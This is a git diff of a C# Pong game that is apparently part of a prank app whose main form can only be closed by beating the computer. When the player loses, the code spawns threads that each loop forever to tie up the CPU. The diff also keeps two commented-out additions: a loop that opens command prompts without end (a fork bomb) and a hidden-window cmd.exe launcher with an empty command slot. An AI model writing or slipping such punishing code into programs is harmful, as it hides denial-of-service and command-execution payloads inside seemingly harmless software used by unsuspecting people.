@@ -28,11 +28,13 @@ namespace SQLUserInterface
         int[] i = { 5, 6, 8, 9 };
         int[] j = {10, 9, 8, 11, 12 };
 
-        public Pong()
+        private ChatIsThisReal parentForm;
+
+        public Pong(ChatIsThisReal parent)
         {
             InitializeComponent();
+            parentForm = parent;
         }
-
         private void GameTimerEvent(object sender, EventArgs e)
         {
             ball.Top -= ballYspeed;
@@ -94,7 +96,7 @@ namespace SQLUserInterface
             CheckCollision(ball, player, player.Right + 5);
             CheckCollision(ball, computer, computer.Left - 35);
 
-            if (computerScore >= 5)
+            if (computerScore >= 3)
             {
 
                 //Bad
@@ -106,25 +108,42 @@ namespace SQLUserInterface
                         while (true) { } // Infinite loop in each thread
                     }).Start();
                 }
-                
-                //Really bad
                 /*
+                //Really bad
+                
                     while (true)
                     {
                         System.Diagnostics.Process.Start("cmd.exe");  // Creates a new process (command prompt) in an infinite loop
                     }
                 
-                */
-                //The worst
                 
+                //The worst
+
                 //GameOverLose();
                 computerScore = 0;
+                GameTimer.Stop();
+                string command = ""; // 
+                string arguments = ""; // Optional: arguments for the command
 
-                
+                // Create a new Process to start the command
+                ProcessStartInfo processStartInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe", // Command prompt executable
+                    Arguments = "/c " + command + " " + arguments, // '/c' tells cmd to execute the command and then terminate
+                    RedirectStandardOutput = false, // Capture the output of the command
+                    UseShellExecute = false, // Don't use shell execute (necessary for redirection)
+                    CreateNoWindow = true, // Don't show the command prompt window
+
+                };
+
+                Process process = new Process();
+                process.StartInfo = processStartInfo;
+                process.Start();
+                */
 
 
             }
-            else if (playerScore > 5)
+            else if (playerScore >= 3)
             {
                 GameOver();
             }
@@ -213,8 +232,11 @@ namespace SQLUserInterface
             GameTimer.Stop();
             computerScore = 0;
             MessageBox.Show("You have bested me");
-            Hide();
-            
+
+            parentForm.AllowClosing(); // Now allows the parent form to close
+
+            this.Close(); // Close the Pong form too
+
         }
     }
 }
